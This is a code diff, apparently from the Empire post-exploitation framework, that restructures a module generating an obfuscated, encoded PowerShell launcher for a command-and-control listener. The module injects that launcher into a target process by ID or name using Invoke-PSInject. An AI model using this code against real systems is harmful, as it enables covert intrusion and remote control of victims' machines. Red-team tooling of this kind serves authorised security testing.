@@ -41,37 +41,37 @@ class Module:
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
             return handle_error_message(f"[!] Invalid listener: {listener_name}")
+
+        # generate the PowerShell one-liner with all of the proper options set
+        launcher = main_menu.stagergenv2.generate_launcher(
+            listener_name=listener_name,
+            language="powershell",
+            obfuscate=launcher_obfuscate,
+            obfuscation_command=launcher_obfuscate_command,
+            encode=True,
+            user_agent=user_agent,
+            proxy=proxy,
+            proxy_creds=proxy_creds,
+            bypasses=params["Bypasses"],
+        )
+        MAX_LAUNCHER_LEN = 5952
+        if launcher == "":
+            return handle_error_message("[!] Error in launcher generation.")
+        if len(launcher) > MAX_LAUNCHER_LEN:
+            return handle_error_message("[!] Launcher string is too long!")
+
+        launcher_code = launcher.split(" ")[-1]
+
+        if proc_id != "":
+            script_end += f"Invoke-PSInject -ProcID {proc_id} -PoshCode {launcher_code}"
         else:
-            # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagergenv2.generate_launcher(
-                listener_name=listener_name,
-                language="powershell",
-                obfuscate=launcher_obfuscate,
-                obfuscation_command=launcher_obfuscate_command,
-                encode=True,
-                user_agent=user_agent,
-                proxy=proxy,
-                proxy_creds=proxy_creds,
-                bypasses=params["Bypasses"],
+            script_end += (
+                f"Invoke-PSInject -ProcName {proc_name} -PoshCode {launcher_code}"
             )
-            if launcher == "":
-                return handle_error_message("[!] Error in launcher generation.")
-            elif len(launcher) > 5952:
-                return handle_error_message("[!] Launcher string is too long!")
-            else:
-                launcher_code = launcher.split(" ")[-1]
 
-                if proc_id != "":
-                    script_end += (
-                        f"Invoke-PSInject -ProcID {proc_id} -PoshCode {launcher_code}"
-                    )
-                else:
-                    script_end += f"Invoke-PSInject -ProcName {proc_name} -PoshCode {launcher_code}"
-
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
